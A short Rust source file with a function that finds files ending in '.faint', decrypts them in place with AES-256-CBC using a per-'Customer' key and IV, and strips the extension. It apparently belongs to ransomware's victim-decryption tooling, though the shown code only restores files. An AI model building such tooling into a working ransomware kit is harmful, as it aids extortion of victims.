use std::{fs, path};

#[derive(Debug)]
pub struct Keypair {
    pub key: String,
    pub iv: String,
}
#[derive(Debug)]
pub struct Customer {
    pub keypair: Keypair,
    pub identification: String,
}

pub fn decrypt(file: &path::PathBuf, customer: &Customer) {
    if file.extension().is_some() && file.extension().unwrap() == "faint" {
        println!("{}", file.display());
        if let Ok(file_content) = fs::read(file) {
            let cipher =
                libaes::Cipher::new_256(customer.keypair.key.as_bytes().try_into().unwrap());
            let decrypted = cipher.cbc_decrypt(customer.keypair.iv.as_bytes(), &file_content);
            if let Ok(_) = fs::write(file, decrypted) {
                fs::rename(
                    file,
                    file.to_string_lossy()
                        .split_at(file.to_string_lossy().len() - 6)
                        .0,
                )
                .unwrap();
            }
        }
    };
}
